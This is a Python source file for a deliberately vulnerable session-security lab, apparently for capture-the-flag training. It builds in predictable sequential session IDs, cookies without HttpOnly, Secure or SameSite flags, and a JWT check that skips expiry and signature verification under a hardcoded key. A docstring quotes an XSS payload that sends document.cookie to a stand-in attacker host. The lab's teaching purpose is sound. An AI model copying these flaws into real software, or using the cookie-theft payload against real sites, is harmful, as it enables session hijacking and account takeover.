"""Session security lab: prediction, flags, fixation, JWT replay."""
import os, json, hashlib, time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

F = {i+1: os.environ.get(f'FLAG_{i+1}', 'FLAG{p}') for i in range(4)}

# Sequential session IDs (predictable)
sessions = {i: {'user': f'user{i}', 'role': 'user'} for i in range(100, 110)}
sessions[99] = {'user': 'admin', 'role': 'admin', 'secret': F[3]}

# Login counter: each new login hands out the next sequential id (predictable!)
next_session_id = 100

def make_jwt(payload, exp=None):
    import base64, hmac
    h = base64.urlsafe_b64encode(json.dumps({'alg':'HS256'}).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    s = base64.urlsafe_b64encode(hmac.new(b'secret', f'{h}.{p}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
    return f'{h}.{p}.{s}'

# Pre-generated expired JWT (exp in the past — but server doesn't check)
expired_jwt = make_jwt({'user':'admin','role':'admin','exp':1000000000})

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        path = parsed.path
        if path == '/': self.send_html(WELCOME)
        elif path == '/login': self.handle_login(params)
        elif path == '/whoami': self.handle_whoami()
        elif path == '/admin': self.handle_admin()
        elif path == '/api-jwt': self.handle_jwt(params)
        elif path == '/steal': self.handle_steal(params)
        else: self.send_html(NOT_FOUND, 404)

    def handle_steal(self, params):
        """Simulates the attacker's cookie collector.

        A cookie without HttpOnly is readable by JavaScript: an XSS payload
        like `fetch('//attacker/steal?c='+document.cookie)` ships it out.
        Send any VALID session id here to prove the exfiltration works.
        """
        stolen = params.get('c', [''])[0]
        try:
            session = sessions.get(int(stolen))
        except ValueError:
            session = None
        if session:
            self.send_json({
                'status': 'cookie received by attacker',
                'stolen': f'session={stolen}',
                'victim': session['user'],
                'note': 'HttpOnly would have blocked document.cookie; '
                        'Secure would have prevented transmission over plain HTTP; '
                        'SameSite=Strict would have limited cross-site sending.',
                'flag': F[2],
            })
        else:
            self.send_json({
                'error': 'no valid session id in ?c=',
                'hint': 'First get a session at /login, then exfiltrate it: /steal?c=100',
            }, 400)

    def handle_login(self, params):
        sid = params.get('sid', [''])[0]
        if not sid:
            global next_session_id
            sid = str(next_session_id)
            next_session_id += 1
            self.send_response(200)
            self.send_header('Set-Cookie', f'session={sid}; Path=/',)  # NO HttpOnly, NO Secure, NO SameSite
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(f'Logged in as user{sid}. Session ID: {sid}'.encode())
            return
        # Login with predicted session ID
        self.send_response(200)
        self.send_header('Set-Cookie', f'session={sid}; Path=/')
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(f'Session set to {sid}. <a href="/whoami">Who am I?</a>'.encode())

    def handle_whoami(self):
        cookie = self.headers.get('Cookie', '')
        sid = ''
        for part in cookie.split(';'):
            if 'session=' in part:
                sid = part.split('=')[1].strip()
        try:
            sid_int = int(sid)
            session = sessions.get(sid_int)
            if session:
                if session['role'] == 'admin':
                    self.send_html(f'You are <b>{session["user"]}</b> (admin). Flag: {F[1]}')
                else:
                    self.send_html(f'You are <b>{session["user"]}</b> (user). Try session ID 99.')
            else:
                self.send_html(f'Session {sid} not found. Try IDs 100-109 (sequential).')
        except ValueError:
            self.send_html('No valid session cookie. <a href="/login">Login first</a>')

    def handle_admin(self):
        cookie = self.headers.get('Cookie', '')
        if 'session=99' in cookie:
            self.send_html(f'Welcome admin! Admin secret: {F[3]}')
        else:
            self.send_html('Access denied. Admin is session ID 99.')

    def handle_jwt(self, params):
        token = params.get('token', [''])[0]
        if not token:
            # Give them the expired admin JWT
            self.send_json({'hint': 'This JWT is expired but the server does NOT check exp', 'token': expired_jwt, 'flag_if_replayed': F[4]})
        else:
            try:
                import base64, hmac
                parts = token.split('.')
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                # VULNERABLE: doesn't check exp
                if payload.get('role') == 'admin':
                    self.send_json({'status': 'admin', 'flag': F[4], 'payload': payload, 'note': 'exp not checked!'})
                else:
                    self.send_json({'status': 'user', 'payload': payload})
            except Exception as e:
                self.send_json({'error': str(e)}, 401)

    def send_json(self, data, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

    def send_html(self, html, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode())
    def log_message(self, *a): pass

WELCOME = """<html><body style="font-family:monospace;padding:40px;background:#0d1117;color:#c9d1d9">
<h1>🍪 Session Lab</h1>
<ul>
<li><a href="/login" style="color:#58a6ff">/login</a> — Get a session (sequential IDs!)</li>
<li><a href="/whoami" style="color:#58a6ff">/whoami</a> — Who am I? (check your cookie)</li>
<li><a href="/admin" style="color:#58a6ff">/admin</a> — Admin area (session=99)</li>
<li><a href="/api-jwt" style="color:#58a6ff">/api-jwt</a> — Expired JWT (exp not checked)</li>
<li><a href="/steal?c=100" style="color:#58a6ff">/steal?c=X</a> — Attacker cookie collector (no HttpOnly demo)</li>
</ul></body></html>"""
NOT_FOUND = '<html><body><h1>404</h1></body></html>'
if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
